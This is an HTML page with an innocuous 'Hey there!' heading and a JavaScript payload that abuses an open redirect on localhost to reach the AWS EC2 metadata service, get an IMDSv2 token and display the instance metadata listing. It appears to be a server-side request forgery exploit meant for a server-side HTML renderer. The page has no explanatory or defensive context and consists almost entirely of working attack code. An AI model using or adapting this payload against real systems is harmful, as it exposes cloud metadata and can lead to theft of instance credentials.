<html>
  <h1>Hey there!</h1>
  <div id="tokenResult"></div>
  <div id="metaDataResult"></div>
  <div id="errorMsg"></div>
  <script>
    const tokenEndpoint = "http://localhost/redir.php?url=http://169.254.169.254/latest/api/token";
    const metadataEndpoint = "http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/";

    const tokenDiv = document.getElementById("tokenResult");
    const metadataDiv = document.getElementById("metaDataResult");
    const errorDiv = document.getElementById("errorMsg");

    let token = "";

    try {
      const xhr = new XMLHttpRequest();

      // בקשת הטוקן
      xhr.open("PUT", tokenEndpoint, false);
      xhr.setRequestHeader("X-aws-ec2-metadata-token-ttl-seconds", "21600");
      xhr.send();
      token = xhr.responseText;
      tokenDiv.innerHTML = `<b>Token:</b> ${token}`;

      // בקשת המטא-דאטה עם הטוקן
      xhr.open("GET", metadataEndpoint, false);
      xhr.setRequestHeader("X-aws-ec2-metadata-token", token);
      xhr.send();
      metadataDiv.innerHTML = `<b>Metadata:</b><br>${xhr.responseText.replace(/\n/g, "<br>")}`;

    } catch (e) {
      errorDiv.innerHTML = `<b>Error:</b> ${e.message}`;
    }
  </script>
</html>
